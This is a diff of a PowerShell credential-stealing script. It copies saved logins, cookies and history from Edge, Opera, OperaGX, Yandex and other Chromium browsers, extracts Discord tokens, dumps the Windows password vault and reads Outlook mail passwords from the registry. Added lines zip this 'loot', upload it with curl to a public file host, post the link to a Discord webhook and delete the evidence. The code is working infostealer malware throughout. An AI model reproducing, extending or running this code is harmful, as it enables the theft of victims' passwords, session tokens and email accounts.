+	Get-Content -Path "$path\Profile 1\Bookmarks" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\Bookmarks"
+	Copy-Item "$path\Profile 1\Local Storage\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\Local Storage\leveldb" -Recurse
+	Copy-Item "$path\Profile 1\Sync Data\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\Sync Data\leveldb" -Recurse
 }
 if ([System.IO.File]::Exists("$path\Profile 2\Preferences")) {
-	New-Item -Path $env:tmp/$FolderName/$Browser/Profile 2 -ItemType Directory
-	Get-Content -Path "$path\Profile 2\Web Data" > "$env:TMP\$FolderName\$Browser\Profile 2\Web Data"
-	Get-Content -Path "$path\Profile 2\Login Data" > "$env:TMP\$FolderName\$Browser\Profile 2\Login Data"
-	Get-Content -Path "$path\Profile 2\Preferences" > "$env:TMP\$FolderName\$Browser\Profile 2\Preferences"
-	Get-Content -Path "$path\Profile 2\Top Sites" > "$env:TMP\$FolderName\$Browser\Profile 2\Top Sites"
-	Get-Content -Path "$path\Profile 2\History" > "$env:TMP\$FolderName\$Browser\Profile 2\History"
-	Get-Content -Path "$path\Profile 2\Bookmarks" > "$env:TMP\$FolderName\$Browser\Profile 2\Bookmarks"
-	Copy-Item "$path\Profile 2\Local Storage\leveldb" "$env:TMP\$FolderName\$Browser\Profile 2\Local Storage\leveldb" -Recurse
-	Copy-Item "$path\Profile 2\Sync Data\leveldb" "$env:TMP\$FolderName\$Browser\Profile 2\Sync Data\leveldb" -Recurse
+	New-Item -Path $env:tmp/$FolderName/Browsers/$Browser/Profile 2 -ItemType Directory
+	Get-Content -Path "$path\Profile 2\Web Data" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\Web Data"
+	Get-Content -Path "$path\Profile 2\Login Data" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\Login Data"
+	Get-Content -Path "$path\Profile 2\Preferences" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\Preferences"
+	Get-Content -Path "$path\Profile 2\Top Sites" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\Top Sites"
+	Get-Content -Path "$path\Profile 2\History" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\History"
+	Get-Content -Path "$path\Profile 2\Bookmarks" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\Bookmarks"
+	Copy-Item "$path\Profile 2\Local Storage\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\Local Storage\leveldb" -Recurse
+	Copy-Item "$path\Profile 2\Sync Data\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\Sync Data\leveldb" -Recurse
 }
 if ([System.IO.File]::Exists("$path\Profile 3\Preferences")) {
-	New-Item -Path $env:tmp/$FolderName/$Browser/Profile 3 -ItemType Directory
-	Get-Content -Path "$path\Profile 3\Web Data" > "$env:TMP\$FolderName\$Browser\Profile 3\Web Data"
-	Get-Content -Path "$path\Profile 3\Login Data" > "$env:TMP\$FolderName\$Browser\Profile 3\Login Data"
-	Get-Content -Path "$path\Profile 3\Preferences" > "$env:TMP\$FolderName\$Browser\Profile 3\Preferences"
-	Get-Content -Path "$path\Profile 3\Top Sites" > "$env:TMP\$FolderName\$Browser\Profile 3\Top Sites"
-	Get-Content -Path "$path\Profile 3\History" > "$env:TMP\$FolderName\$Browser\Profile 3\History"
-	Get-Content -Path "$path\Profile 3\Bookmarks" > "$env:TMP\$FolderName\$Browser\Profile 3\Bookmarks"
-	Copy-Item "$path\Profile 3\Local Storage\leveldb" "$env:TMP\$FolderName\$Browser\Profile 3\Local Storage\leveldb" -Recurse
-	Copy-Item "$path\Profile 3\Sync Data\leveldb" "$env:TMP\$FolderName\$Browser\Profile 3\Sync Data\leveldb" -Recurse
+	New-Item -Path $env:tmp/$FolderName/Browsers/$Browser/Profile 3 -ItemType Directory
+	Get-Content -Path "$path\Profile 3\Web Data" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\Web Data"
+	Get-Content -Path "$path\Profile 3\Login Data" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\Login Data"
+	Get-Content -Path "$path\Profile 3\Preferences" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\Preferences"
+	Get-Content -Path "$path\Profile 3\Top Sites" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\Top Sites"
+	Get-Content -Path "$path\Profile 3\History" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\History"
+	Get-Content -Path "$path\Profile 3\Bookmarks" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\Bookmarks"
+	Copy-Item "$path\Profile 3\Local Storage\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\Local Storage\leveldb" -Recurse
+	Copy-Item "$path\Profile 3\Sync Data\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\Sync Data\leveldb" -Recurse
 }
 }
 
@@ -1272,7 +1319,7 @@ chromiumBrowser -Path "$env:appdata\..\Local\Microsoft\Edge" -Browser "Edge"
 [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
 $vault = New-Object Windows.Security.Credentials.PasswordVault
 $passwords = $vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | Select-Object username,resource,password | Format-Table | Out-String
-Write-Output $passwords > "$env:TMP\$FolderName\Edge\Passwords.txt"
+Write-Output $passwords > "$env:TMP\$FolderName\Browsers\Edge\Passwords.txt"
 
 }
 
@@ -1290,37 +1337,37 @@ taskkill /IM opera.exe /F
 taskkill /IM launcher.exe /F
 Start-Sleep 1
 $Browser="Opera"
-New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
+New-Item -Path $env:tmp/$FolderName/Browsers/$Browser -ItemType Directory
 $localstate = "$path\Local State"
 $logindata = "$path\Login Data"
 $preferences = "$path\Preferences"
 $leveldb = "$path\Local Storage\leveldb"
-Copy-Item $leveldb "$env:TMP\$FolderName\$Browser\Local Storage\leveldb" -Recurse
-$lvdb = "$env:TMP\$FolderName\$Browser\Local Storage\leveldb"
+Copy-Item $leveldb "$env:TMP\$FolderName\Browsers\$Browser\Local Storage\leveldb" -Recurse
+$lvdb = "$env:TMP\$FolderName\Browsers\$Browser\Local Storage\leveldb"
 $ldb = Get-ChildItem $lvdb\*.ldb
 foreach ($file in $ldb) {
 	$file=$file.Name
 	$f="$lvdb\$file"
 	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
-	Write-Output $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens >> "$env:TMP\$FolderName\Browsers\$Browser\DiscordTokens.txt"
 	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
-	Write-Output $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens2 >> "$env:TMP\$FolderName\Browsers\$Browser\DiscordTokens.txt"
 }
 $log = Get-ChildItem $lvdb\*.log
 foreach ($file in $log) {
 	$file=$file.Name
 	$f="$lvdb\$file"
 	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
-	Write-Output $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens >> "$env:TMP\$FolderName\Browsers\$Browser\DiscordTokens.txt"
 	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
-	Write-Output $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens2 >> "$env:TMP\$FolderName\Browsers\$Browser\DiscordTokens.txt"
 }
 $webdata = "$path\Web Data"
-Copy-Item $webdata "$env:TMP\$FolderName\$Browser\Web Data"
-Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
-Copy-Item $logindata "$env:TMP\$FolderName\$Browser\Login Data"
-Copy-Item $localdata "$env:TMP\$FolderName\$Browser\Local Data"
-Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
+Copy-Item $webdata "$env:TMP\$FolderName\Browsers\$Browser\Web Data"
+Copy-Item $localstate "$env:TMP\$FolderName\Browsers\$Browser\Local State"
+Copy-Item $logindata "$env:TMP\$FolderName\Browsers\$Browser\Login Data"
+Copy-Item $localdata "$env:TMP\$FolderName\Browsers\$Browser\Local Data"
+Copy-Item $preferences "$env:TMP\$FolderName\Browsers\$Browser\Preferences"
 
 }
 
@@ -1331,37 +1378,37 @@ taskkill /IM opera.exe /F
 taskkill /IM launcher.exe /F
 Start-Sleep 1
 $Browser="OperaCrypto"
-New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
+New-Item -Path $env:tmp/$FolderName/Browsers/$Browser -ItemType Directory
 $localstate = "$path\Local State"
 $logindata = "$path\Login Data"
 $preferences = "$path\Preferences"
 $leveldb = "$path\Local Storage\leveldb"
-Copy-Item $leveldb "$env:TMP\$FolderName\$Browser\Local Storage\leveldb" -Recurse
-$lvdb = "$env:TMP\$FolderName\$Browser\Local Storage\leveldb"
+Copy-Item $leveldb "$env:TMP\$FolderName\Browsers\$Browser\Local Storage\leveldb" -Recurse
+$lvdb = "$env:TMP\$FolderName\Browsers\$Browser\Local Storage\leveldb"
 $ldb = Get-ChildItem $lvdb\*.ldb
 foreach ($file in $ldb) {
 	$file=$file.Name
 	$f="$lvdb\$file"
 	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
-	Write-Output $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens >> "$env:TMP\$FolderName\Browsers\$Browser\DiscordTokens.txt"
 	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
-	Write-Output $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens2 >> "$env:TMP\$FolderName\Browsers\$Browser\DiscordTokens.txt"
 }
 $log = Get-ChildItem $lvdb\*.log
 foreach ($file in $log) {
 	$file=$file.Name
 	$f="$lvdb\$file"
 	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
-	Write-Output $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens >> "$env:TMP\$FolderName\Browsers\$Browser\DiscordTokens.txt"
 	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
-	Write-Output $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens2 >> "$env:TMP\$FolderName\Browsers\$Browser\DiscordTokens.txt"
 }
 $webdata = "$path\Web Data"
-Copy-Item $webdata "$env:TMP\$FolderName\$Browser\Web Data"
-Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
-Copy-Item $logindata "$env:TMP\$FolderName\$Browser\Login Data"
-Copy-Item $localdata "$env:TMP\$FolderName\$Browser\Local Data"
-Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
+Copy-Item $webdata "$env:TMP\$FolderName\Browsers\$Browser\Web Data"
+Copy-Item $localstate "$env:TMP\$FolderName\Browsers\$Browser\Local State"
+Copy-Item $logindata "$env:TMP\$FolderName\Browsers\$Browser\Login Data"
+Copy-Item $localdata "$env:TMP\$FolderName\Browsers\$Browser\Local Data"
+Copy-Item $preferences "$env:TMP\$FolderName\Browsers\$Browser\Preferences"
 
 }
 
@@ -1372,37 +1419,37 @@ taskkill /IM opera.exe /F
 taskkill /IM launcher.exe /F
 Start-Sleep 1
 $Browser="OperaGX"
-New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
+New-Item -Path $env:tmp/$FolderName/Browsers/$Browser -ItemType Directory
 $localstate = "$path\Local State"
 $logindata = "$path\Login Data"
 $preferences = "$path\Preferences"
 $leveldb = "$path\Local Storage\leveldb\"
-Copy-Item $leveldb "$env:TMP\$FolderName\$Browser\Local Storage\leveldb" -Recurse
-$lvdb = "$env:TMP\$FolderName\$Browser\Local Storage\leveldb"
+Copy-Item $leveldb "$env:TMP\$FolderName\Browsers\$Browser\Local Storage\leveldb" -Recurse
+$lvdb = "$env:TMP\$FolderName\Browsers\$Browser\Local Storage\leveldb"
 $ldb = Get-ChildItem $lvdb\*.ldb
 foreach ($file in $ldb) {
 	$file=$file.Name
 	$f="$lvdb\$file"
 	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
-	Write-Output $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens >> "$env:TMP\$FolderName\Browsers\$Browser\DiscordTokens.txt"
 	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
-	Write-Output $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens2 >> "$env:TMP\$FolderName\Browsers\$Browser\DiscordTokens.txt"
 }
 $log = Get-ChildItem $lvdb\*.log
 foreach ($file in $log) {
 	$file=$file.Name
 	$f="$lvdb\$file"
 	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
-	Write-Output $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens >> "$env:TMP\$FolderName\Browsers\$Browser\DiscordTokens.txt"
 	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
-	Write-Output $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens2 >> "$env:TMP\$FolderName\Browsers\$Browser\DiscordTokens.txt"
 }
 $webdata = "$path\Web Data"
-Copy-Item $webdata "$env:TMP\$FolderName\$Browser\Web Data"
-Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
-Copy-Item $localdata "$env:TMP\$FolderName\$Browser\Local Data"
-Copy-Item $logindata "$env:TMP\$FolderName\$Browser\Login Data"
-Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
+Copy-Item $webdata "$env:TMP\$FolderName\Browsers\$Browser\Web Data"
+Copy-Item $localstate "$env:TMP\$FolderName\Browsers\$Browser\Local State"
+Copy-Item $localdata "$env:TMP\$FolderName\Browsers\$Browser\Local Data"
+Copy-Item $logindata "$env:TMP\$FolderName\Browsers\$Browser\Login Data"
+Copy-Item $preferences "$env:TMP\$FolderName\Browsers\$Browser\Preferences"
 }
 
 # Get Yandex Passwords
@@ -1411,6 +1458,23 @@ taskkill /IM browser.exe /F
 Start-Sleep 1
 chromiumBrowser -Path "$env:appdata\..\Local\Yandex\YandexBrowser" -Browser "Yandex"
 }
+
+Compress-Archive -Path $env:tmp/$FolderName/Browsers -DestinationPath "$env:tmp/Browsers-$ZIP"
+
+$text = "**Browsers**: Loot captured! Here is the URL (It expires in 12 hours): "
+$text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/Browsers-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
+
+$hookurl = "$dc"
+
+$Body = @{
+  'username' = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)"
+  'content' = $text
+}
+
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+
+Remove-Item "$env:TEMP\$FolderName\Browsers" -r -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\Browsers-$ZIP" -r -Force -ErrorAction SilentlyContinue
 
 ############################################################################################################################################################
 
@@ -1503,6 +1567,73 @@ function Get-ScreenCapture
 
 $ss = Get-ScreenCapture
 
+# Outlook
+function get-Outlook {
+	$data=""
+	try {
+	$outlook1 = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676" 
+	$email = $outlook1 | Select-Object Email | Format-Table -AutoSize -Wrap | Out-String
+	$imap = $outlook1 | Select-Object "IMAP Password" | Format-Table -AutoSize -Wrap | Out-String
+	$pop3 = $outlook1 | Select-Object "POP3 Password" | Format-Table -AutoSize -Wrap | Out-String
+	$http = $outlook1 | Select-Object "HTTP Password" | Format-Table -AutoSize -Wrap | Out-String
+	$smtp = $outlook1 | Select-Object "SMTP Password" | Format-Table -AutoSize -Wrap | Out-String
+	$smtpserv = $outlook1 | Select-Object "SMTP Server" | Format-Table -AutoSize -Wrap | Out-String
+	$data+=$email+$imap+$pop3+$http+$smtp+$smtpserv
+	}
+
+	catch {
+		try {
+		$outlook2 = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676" 
+		$email = $outlook2 | Select-Object Email | Format-Table -AutoSize -Wrap | Out-String
+		$imap = $outlook2 | Select-Object "IMAP Password" | Format-Table -AutoSize -Wrap | Out-String
+		$pop3 = $outlook2 | Select-Object "POP3 Password" | Format-Table -AutoSize -Wrap | Out-String
+		$http = $outlook2 | Select-Object "HTTP Password" | Format-Table -AutoSize -Wrap | Out-String
+		$smtp = $outlook2 | Select-Object "SMTP Password" | Format-Table -AutoSize -Wrap | Out-String
+		$smtpserv = $outlook2 | Select-Object "SMTP Server" | Format-Table -AutoSize -Wrap | Out-String
+		$data+=$email+$imap+$pop3+$http+$smtp+$smtpserv
+		}
+
+		catch {
+			try {
+			$outlook3 = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows Messaging Subsystem\Profiles\9375CFF0413111d3B88A00104B2A6676" 
+			$email = $outlook3 | Select-Object Email | Format-Table -AutoSize -Wrap | Out-String
+			$imap = $outlook3 | Select-Object "IMAP Password" | Format-Table -AutoSize -Wrap | Out-String
+			$pop3 = $outlook3 | Select-Object "POP3 Password" | Format-Table -AutoSize -Wrap | Out-String
+			$http = $outlook3 | Select-Object "HTTP Password" | Format-Table -AutoSize -Wrap | Out-String
+			$smtp = $outlook3 | Select-Object "SMTP Password" | Format-Table -AutoSize -Wrap | Out-String
+			$smtpserv = $outlook3 | Select-Object "SMTP Server" | Format-Table -AutoSize -Wrap | Out-String
+			$data+=$email+$imap+$pop3+$http+$smtp+$smtpserv
+			}
+
+			catch {
+				try {
+				$outlook4 = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676" 
+				$email = $outlook4 | Select-Object Email | Format-Table -AutoSize -Wrap | Out-String
+				$imap = $outlook4 | Select-Object "IMAP Password" | Format-Table -AutoSize -Wrap | Out-String
+				$pop3 = $outlook4 | Select-Object "POP3 Password" | Format-Table -AutoSize -Wrap | Out-String
+				$http = $outlook4 | Select-Object "HTTP Password" | Format-Table -AutoSize -Wrap | Out-String
+				$smtp = $outlook4 | Select-Object "SMTP Password" | Format-Table -AutoSize -Wrap | Out-String
+				$smtpserv = $outlook4 | Select-Object "SMTP Server" | Format-Table -AutoSize -Wrap | Out-String
+				$data+=$email+$imap+$pop3+$http+$smtp+$smtpserv
+				}
+
+				catch {
+				Write-Error "No Outlook"
+				return $null
+				-ErrorAction SilentlyContinue
+				}
+		}
+		}
+	}
+	
+	return $data
+}
+
+$outlook = get-Outlook
+if ($outlook -ne $null) {
+	$outlook >> $env:tmp/$FolderName/Gaming/OutlookData.txt
+}
+
 # Get Clipboard
 Get-Clipboard > "$env:temp\$FolderName\Clipboard.txt";
 
@@ -1532,7 +1663,7 @@ if (-not ([string]::IsNullOrEmpty($db))){dropbox}
 ############################################################################################################################################################
 
 # Upload file to temp file storage
-$text = "Loot captured! Here is the URL: "
+$text = "Loot captured! Here is the URL (It expires in 12 hours): "
 $text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
 
 function Upload-Discord {
